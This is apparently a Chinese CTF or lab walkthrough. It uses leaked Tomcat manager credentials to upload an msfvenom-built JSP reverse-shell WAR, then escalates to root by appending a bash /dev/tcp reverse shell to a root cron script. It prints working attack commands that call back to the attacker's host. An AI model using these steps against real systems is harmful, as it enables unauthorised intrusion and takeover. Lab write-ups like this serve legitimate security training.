访问 /manager，出现了登录框，尝试输入几个弱密码，三次失败后弹出错误页面

但是该错误页面却显示了正确的账号密码

<user username="tomcat" password="s3cret" roles="manager-gui"/

使用此账号密码成功登录

在该页面下发现一个文件上的点，可以上传 war 包

利用 msfvenom 生成一个 shell.war

┌──(root㉿kali)-[~/桌面]
└─# msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.140.133 LPORT=4444 -f war -o shell.war 
Payload size: 1097 bytes
Final size of war file: 1097 bytes
Saved as: shell.war

上传后会有一个 /shell 链接，本机监听 4444 端口，同时访问该链接

成功反弹，查找 user.txt，得到第一个 flag

查看该文件，发现它会把 id 命令的执行结果写入 test.txt

查看 test.txt 文件，结果是 root 用户，也就是 id.sh 是以 root 权限执行的

同时注意到 test.txt 的修改时间是此时的时间，也就是说这可能是一个定时任务

在 cron 里面搜索，确定了这就是一个定时任务

cat id.sh
#!/bin/bash
id > test.txt

cat test.txt
uid=0(root) gid=0(root) groups=0(root)

grep -r "id.sh" /etc/cron* 2>/dev/null
/etc/crontab:*  *       * * *   root    cd /home/jack && bash id.sh

由于有写入权限，那就将反弹命令写入 id.sh

echo 'bash -c "bash -i >& /dev/tcp/192.168.140.133/4444 0>&1"' >> id.sh

同时监听写入端口，等待一会后成功拿到 root 权限
